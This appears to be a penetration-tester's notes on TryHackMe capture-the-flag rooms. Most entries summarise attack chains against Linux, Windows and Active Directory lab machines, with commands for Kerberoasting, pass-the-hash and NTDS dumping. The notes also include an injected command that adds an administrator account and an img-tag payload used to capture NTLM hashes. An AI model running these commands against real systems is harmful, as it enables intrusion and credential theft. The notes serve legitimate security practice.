 # THM-YearOfTheFox
- Linux
- My writeup available on medium.
- JSON Injection.
- `socat` tunneling.
- `sudo -l` => `/usr/sbin/shutdown`

# THM-Peakhill
- Linux
- Pickle Module
- `__reduce__()` method to return class objects to spawn shell.

# THM-Kitty
- Linux
- My writeup available on medium.
- Manual Boolean based SQL Injection with script.
- `pspy` for process check for other users like root.
- SSH tunneling.

# THM-Blog
- Linux
- My writeup available on medium.
- Wordpress
- Find WP login credentials for Authenticated RCE vulnerability i.e. `CVE-2019-8943` and `CVE-2019-8942`. Rather directly refer metasploit `multi/http/wp_crop_rce` module.
- Finally a SUID set binary 'checker' reversed with ghidra.

# THM-AnonymousPlayground
- Linux
- My writeup available on medium.
- Cipher
- Buffer Overflow. Also the concept behind why an overflow might not process a function that need a hold on standard input buffer.
- Tar Wildcard Exploit.

# THM-SuperSecretTip
- Linux
- My writeup available on medium.
- Flask based WebApp Source code review.
- SSTI

# THM-Internal
- Linux
- Wordpress
- Socat for tunneling.
- Jenkins Bruteforce (admin)

# THM-Blueprint
- Windows
- osCommerce 2.3.4 Unauthenticated RCE.
Link: https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution/blob/main/osCommerce2_3_4RCE.py

# THM-Anthem
- Windows
- Umbraco CMS.
- Hidden file + Change permission for current user.

# THM-Blaster
- Windows
- Directory bruteforce and `retro` directory.
- Guessed the credentials from the users blogs.
- Now for escalation found `hhupd.exe` on desktop that points to `CVE-2019-1388`. So, for that refer **WindowsExploitation** **PrivilegeEscalation** notes under **Miscellanous.html** under **CVE-2019-1388** topic.
- Practiced some persistence techniques.

# THM-Thompson
- Linux
- Default Tomcat credentials. `tomcat:s3cret`
- Now from the manager, crafted a `backup.war` payload with msfvenom, uploaded and deployed it for reverseshell.
- Finally found a writable script that runs as a cronjob as root. So, edited it for a reverseshell.

# THM-AVenger
- Windows
- Found a file upload functionality which is checked by the admins staff. Also, it is mentioned that AV is enabled by default.
- So, got a `Nim` based AV bypass revshell script executable and compiled it to get the executable and finally uploaded and got the shell.
- Now used [HoaxShell](:/bbbc17b986a04040be5fb9649312fd6b) to get a stable shell.
- Now found the credential in registry and also in the command history file. So, finally using that did RDP on this `hugo` user.
- Now for privesc found this user to be a member of the Admin group using `whoami /groups`.
- Finally ran powershell as administrator by right clicking and got admin access.

# THM-HackSmarterSecurity
- Windows
- Found Dell OpenManage Login on port `1311`. Got the version `9.4.0.2` from about section and located `CVE-2020-5377`
Link: https://rhinosecuritylabs.com/research/cve-2020-5377-dell-openmanage-server-administrator-file-read/
- Now using this CVE, read the `web.config` file by guessing the location as `C:\inetpub\wwwroot\hacksmartersecurity\web.config` through which got SSH credentials.
- Now Windows Defender was there so had to do manual enumeration. So,= with `ps` command located a process and,
`sc.exe qc spoofer-scheduler` => Located the service binary associated with it and noticed had unqouted path in it.
`sc.exe query spoofer-scheduler` => Found it is stoppable and startable by us.
Also found the path of the service binary was writeable. So, used the `nim` reverseshell script that can bypass AV checks and replaced the service binary and `hoaxshell` to stabilize the shell.
`sc.exe stop spoofer-schedule`
`sc.exe start spoofer-schedule`

# THM-Enterprise-AD
- Port `7990` was open with Atlassian on it, stating they are moving to Github. So, did a Google Search on that and found a link to powershell script whose previous commit had a username and passwd.
- So, using this credential, used the impacket's `GetUserSPNs` script,
`impacket-GetUserSPNs 'LAB.ENTERPRISE.THM/nik:ToastyBoi!' -dc-ip _IP_ -request`
to dump Kerberoastable account hash and got it cracked.
- So, now this account got us RDP access and ran the `Winpeas.exe` script and found an unquoted service path on a service. So, finally used that to put the reverseshell to it, getting the service started and getting a `System` shell.

# THM-Stealth
- Windows
- User was CTFish.
- For PrivEsc, ran `PrivescCheck.ps1` and found a writable `xampp` server directory. So, downloaded the `p0wny` webshell script and executed by visiting the `shell.php` through the browser which allowed to see the hidden `SeImpersonate` privilege,
Link: https://github.com/flozz/p0wny-shell/
Now used the `EfsPotato` C-Sharp script exploit,
Link: https://github.com/zcgonvh/EfsPotato

# THM-Flatline
- Windows
- For user shell, got a Command Execution exploit,
Link: https://www.exploit-db.com/exploits/47799
and got the shell using it.
- Now we were already in the administrators group, but were not allowed to access `root.txt`. So, changed ownership and permissions on it with,
```
takeown /R /F .\root.txt   => Take OwnerShip
icacls ".\root.txt" /grant _UserName_:F	   => Gave full permissions to our current user
```

# THM-YearOfTheOwl
- Windows
- For user, we did a UDP `Nmap` scan and found `snmp` open. So, now had to bruteforce the `CommunityString` with hydra.
`hydra -P /usr/share/wordlists/rockyou.txt _IP_ snmp`
And now, got a username from the user default OID value using `snmpwalk`.
- Now for user located sam dump files in recycle bin,
got the sid of our current user with `whoami /all` and then,
`cd 'C:\$Recycle.bin\_SID_'`
to get the recycle bin files. Now use impackets `secretsdump` module to get the hashes and performed pass the hash on Admin user account.

# THM-Ra-AD
- Windows
- While enumerating webpage on port 80, located a question based password reset functionality. Now on the page located an image with a girl holding a dog and saving it found the name of the dog in the image name itself. Now got the password reset and got access to smb share to locate the first flag with the `spider_plus` mode in `crackmapexec` tool.
- Now we also found a link to `sparky` application which is a chat message service app. Installed and logged into it using the user whose passwd we just reset. And now located the user who was online. So, used the payload `<img src='http://tun0/test.png'>` and sent to this user online and started `responder` to listen for this online user's NTLM hash when he interacts with the message.
Now cracked the hash and logged in and got the user flag i.e. flag2. 
- Now for privesc, found our user is in `Account Operator` group and located a powershell script in `C:\` directory. This script passes the content of a `hosts.txt` file which is owned by another user on the machine to the dangerous method `Invoke-Expression` which runs as admin user.
So, with current user's privilege, changed the credential of this `hosts.txt` file owned user and via `smbclient` got a new `hosts.txt` file with the following content,
`; net user myuser test@1234 /add; net localgroup Administrators myuser /add`
So, within few seconds, the script runs again and adds a new user and puts him in the Admin group and finally we can RDP as this new admin user.

# THM-FusionCorp-AD
- Windows
- Found a user wordlist from the website's `/backup` directory through fuzzing.
- Now used `Impackets-GetNPUsers` to look for users that do not require Kerberos preauthentication from the list,
`Impackets-GetNPUsers fusion.corp -no-pass -usersfile users.txt`
and located the ticket and got it cracked with `hashcat`.
- Now logged in and in other user's description found his passwd too,
`net user jmurphy /domain`
- Now logged in and found this user in the `Backup Operator` group and hence, did sam, system reg dump and also `NTDS.dit` file dump. And finally located the admin NTLM hash with `impackets-secretsdump` and performed pass the hash and got the shell.

# THM-VulnNet:Roasted-AD
- Windows
- From the SMB share found some files that contained some usernames. So, couldn't locate the correct firstname and secondname combination. So, now looked for usernames with,
`impacket-lookupsid vulnnet-rst.local/guest@10.10.111.177`
- Now got one user's hash with,
`impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile users.txt`
and got it cracked.
- Now ran the `BloodHound-Python` module using this user and located another user who is in the `Domain Admin` group. 
- Now was unable to login with this, so now went into the SMB share and in one of them found a vbscript that had another user's credential who was the domain user we found above via BloodHound.
- Finally got the NTDS dumps using these new credentials,
`crackmapexec smb vulnnet-rst.local -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' --ntds`
and got the admin hash and finally got shell access by passing the admin hash.

# THM-VulnNet:Active-AD
- Windows
- My writeup available on medium.
- Found a way to capture hash from the `redis-cli` interface using the `lua` script command share access method.
- Now cracked hash and got access to SMB share where we got write access. So, we found a powershell script that was getting executed by a scheduled task and replaced the content with a reverse shell.
- Finally for privesc used the `meterpreter` utility `getsystem` because roguepotato, juicypotato, etc. were all failing.

# THM-Reset-AD
- Got some credentials on the SMB share but seemed useless. Performed URL File attack and grabbed hash for the `automate` user and got the first flag.
- Now used `impacket-GetNPUsers` to locate users which have Kerberos Pre-Authentication disabled and found 3 out of which only one of the tickets cracked.
- So, now we ran `bloodhound-python` utility to remotely gather `json` files for BloodHound.
- Now in BloodHound GUI we found, the user whose ticket we grabbed and cracked, had a link towards Administrator through a series of `Generic All`, `ForceChangePassword`, `Owns` relations to the three consecutive users respectively.
- Now this third user had `AllowedToDelegate` relation on `haystack.thm.corp` computer which contained the Admin user.
So, we leveraged the delegations by getting the SPN from the `Node Info` tab on BloodHound for this third user and finally used,
`impacket-getST -spn cifs/HayStack.thm.corp -dc-ip 10.10.33.128 -impersonate 'Administrator' thm.corp/darla_winters:Pass@123`
And gathered admins ticket.
- Now finally we can export the required variable with,
`export KRB5CCNAME=Administrator@cifs_HayStack.thm.corp@THM.CORP.ccache`
and got admin shell with,
`impacket-wmiexec Administrator@haystack.thm.corp -no-pass -k`
and got the final flag.

# THM-AttacktiveDirectory-AD
- Windows
- We were given a custom `user.txt` which allowed to enumerate users with `kerbrute` and we found two eye catching users i.e. `backup` and `svc-admin`. 
- Now used the `impacket-GetNPUsers` on both these users and we got the ticket for `svc-admin` and got it cracked.
- Now logged in to SMB with these creds and found a share which had credentials for `backup` user.
- So, now this user had backup privileges and hence, we can try to dump hashes from NTDS.dit file with `impacket-secretsdump` remotely with this `backup` user's creds,
`impacket-secretsdump spookysec.local/backup@10.10.191.222`
and got the admin users NTLM hash and performed pass the hash with `evil-winrm` to get all the three flags.

# THM-RazorBlack-AD
- Windows
- Found the port 111 and 2049 open and was specified the `NFS` service. So got the share mounted and found a file with interesting stuff.
- Now mostly it was CTFish and had to use the `impacket` tools recursively to pivot to other users by dumping tickets, hashes, and eventually cracking them or via pass the hash attack. Also came across to change `SMB` credentials using the `impacket-smbpass` utility as we got the error `STATUS_PASSWORD_MUST_CHANGE` on `crackmapexec` while trying password spraying i.e. same password on a users list.
- Also came across dumping securely saved network credentials found in the `.xml` files,
```
$importedCredential = Import-Clixml -Path "_File_.xml"
$importedCredential.GetNetworkCredential().Password => This shows the decrypted password field.
```
- Also one of the users was in the `backup operators` group which allowed us to dump `ntds.dit` and `system.hive` through which we dumped the NTLM hashes of users with `impacket-secretsdump` utility.

